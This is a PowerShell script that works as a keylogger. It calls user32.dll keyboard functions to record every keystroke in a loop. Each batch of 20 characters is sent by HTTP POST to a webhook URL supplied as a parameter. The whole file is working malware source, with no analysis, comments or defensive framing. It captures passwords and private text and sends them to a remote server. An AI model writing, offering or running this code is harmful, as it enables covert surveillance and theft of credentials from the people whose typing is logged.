param($webhookUrl)

$API=Add-Type -MemberDefinition '[DllImport("user32.dll")]public static extern short GetAsyncKeyState(int vkc);[DllImport("user32.dll")]public static extern int GetKeyboardState(byte[] ks);[DllImport("user32.dll")]public static extern int MapVirtualKey(uint c,int t);[DllImport("user32.dll")]public static extern int ToUnicode(uint vk,uint sc,byte[] ks,System.Text.StringBuilder b,int cb,uint f);' -Name W -Namespace A -PassThru

$b=@()
while($true){
    for($a=9;$a-le254;$a++){
        if($API::GetAsyncKeyState($a)-eq-32767){
            $v=$API::MapVirtualKey($a,3)
            $k=New-Object Byte[] 256
            $API::GetKeyboardState($k)|Out-Null
            $c=New-Object System.Text.StringBuilder
            if($API::ToUnicode($a,$v,$k,$c,$c.Capacity,0)){
                $b+=$c.ToString()
                if($b.Count-eq20){
                    $keystrokes = $b -join ""
                                    Invoke-WebRequest -Uri $webhookUrl -Method POST -Body "===== KEYSTROKES =====`r`n$keystrokes`r`n`r`n" -ContentType "text/plain" -UseBasicParsing
                    $b=@()
                }
            }
        }
    }
    Start-Sleep -Milliseconds 40
}
